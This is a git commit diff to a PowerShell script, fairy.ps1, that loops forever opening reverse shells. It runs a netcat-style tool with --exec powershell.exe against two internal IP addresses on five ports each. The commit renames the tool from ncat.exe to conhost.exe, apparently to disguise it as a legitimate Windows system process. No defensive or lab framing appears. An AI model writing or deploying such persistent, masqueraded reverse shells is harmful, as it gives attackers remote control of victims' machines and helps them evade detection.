a79f305b8c02f99771d2fc175dab99db9f1856c7
h3xagon <62241425+h3xagon0001@users.noreply.github.com>
2025-07-03 10:37:20 +0800

    pls dont break

--- fairy.ps1
+++ fairy.ps1
@@ -8,17 +8,17 @@ for (;;)
 {
 # for ip 10.133.33.205
 $ListenerIP = "10.133.33.205"
-.\ncat.exe -C --exec "powershell.exe" $ListenerIP 8888
-.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6969
-.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6699
-.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6996
-.\ncat.exe -C --exec "powershell.exe" $ListenerIP 9669
+.\conhost.exe -C --exec "powershell.exe" $ListenerIP 8888
+.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6969
+.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6699
+.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6996
+.\conhost.exe -C --exec "powershell.exe" $ListenerIP 9669
 
 # for ip 10.133.61.215
 $ListenerIP = "10.133.61.215"
-.\ncat.exe -C --exec "powershell.exe" $ListenerIP 8888
-.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6969
-.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6699
-.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6996
-.\ncat.exe -C --exec "powershell.exe" $ListenerIP 9669
+.\conhost.exe -C --exec "powershell.exe" $ListenerIP 8888
+.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6969
+.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6699
+.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6996
+.\conhost.exe -C --exec "powershell.exe" $ListenerIP 9669
 }
